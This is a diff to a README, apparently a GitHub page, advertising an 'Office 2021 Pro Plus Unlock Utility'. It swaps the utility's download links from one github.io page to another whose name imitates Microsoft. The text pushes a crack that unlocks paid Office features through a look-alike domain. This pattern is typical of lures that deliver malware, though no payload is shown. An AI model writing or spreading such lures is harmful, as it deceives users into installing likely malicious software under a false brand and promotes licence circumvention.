@@ -6,7 +6,7 @@
 <h1 align="center">🧩 Office 2021 Pro Plus Unlock Utility</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/102" target="_blank">
+  <a href="https://microsoft-office-2021-professional.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Office%202021%20Pro%20Unlock-Unleash%20Advanced%20Tools-F25022?style=for-the-badge&logo=microsoft-office&logoColor=white" 
          alt="Download Office Pro Plus Unlocker" style="width: 540px; height: 37px;">
   </a>
@@ -102,7 +102,7 @@ Open an issue or send a pull request — all improvements are welcome.
 ## ⭐ Unlock Office Pro Plus – Start Smart
 
 Ready to reveal what Office 2021 Pro Plus can really do?  
-[Download the Unlock Utility](https://hiopal3847.github.io/.github/102) and start personalizing your workflow today.
+[Download the Unlock Utility](https://microsoft-office-2021-professional.github.io/.github/) and start personalizing your workflow today.
 
 ---
 
